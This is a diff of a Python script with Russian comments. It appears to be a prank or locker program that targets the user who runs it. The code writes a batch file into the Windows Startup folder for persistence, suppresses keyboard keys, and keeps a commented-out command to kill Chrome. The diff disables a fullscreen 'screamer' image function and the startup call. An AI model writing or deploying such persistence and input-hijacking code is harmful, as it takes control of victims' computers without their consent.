@@ -34,21 +34,22 @@ from webbrowser import open
 
 
 pygame.init()
-
 # получаем имя пользователя (не изменяемо)
 USER_NAME = getuser()
-# batnik = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME + r'open.bat'
-def Im_stupid_I_cant(screamer=False):
-    if screamer == True:
-        _PNG_IMAGE = 'download.jpg'
-        pygame.display.init()
-        img = pygame.image.load(_PNG_IMAGE)
-        screen = pygame.display.set_mode(img.get_size(), pygame.FULLSCREEN)
-        screen.blit(img, (0, 0))
-        pygame.display.flip()
-        pygame.quit()
-    # os.remove(batnik)
-    os.abort()
+batnik = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME + r'open.bat'
+# def Im_stupid_I_cant(screamer=False):
+#     if screamer == True:
+#         _PNG_IMAGE = 'images/screamer.png'
+#         pygame.display.init()
+#         print(pygame.display.get_init)
+#         img = pygame.image.load(_PNG_IMAGE)
+#         flags = pygame.OPENGL | pygame.FULLSCREEN
+#         screen = pygame.display.set_mode((1920, 1080), flags, vsync=1)
+#         screen.blit(img, (0, 0))
+#         pygame.display.flip()
+#         input()
+#         pygame.quit()
+#     os.abort()
 
 # функция добавляющаяся в автозагрузку зависит от USER_NAME (не изменяемо)
 def add_to_startup(file_path=""):
@@ -58,7 +59,7 @@ def add_to_startup(file_path=""):
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
         bat_file.write(r'start "" %s' % file_path)
 
-add_to_startup('')
+# add_to_startup('')
 
 # убиваем chrome(удаляемо, изменяемо), os.system("-->taskkill /IM chrome.exe<--")
 # os.system("taskkill /IM chrome.exe")
@@ -73,7 +74,7 @@ keyboard.add_hotkey("f1", lambda: None, suppress=True)
 
 # сочетвние клавиш на экстренную остановку программы (изменяемо, удаляемо)
 # keyboard.add_hotkey("-->Ctrl + `<--", lambda: os.abort(), suppress=True)
-keyboard.add_hotkey("Ctrl + S", lambda: Im_stupid_I_cant(False), suppress=True)
+keyboard.add_hotkey("Ctrl + S", lambda: os.abort(), suppress=True)
 
 
 # создание случайного названия (удаляемо, не изменяемо)
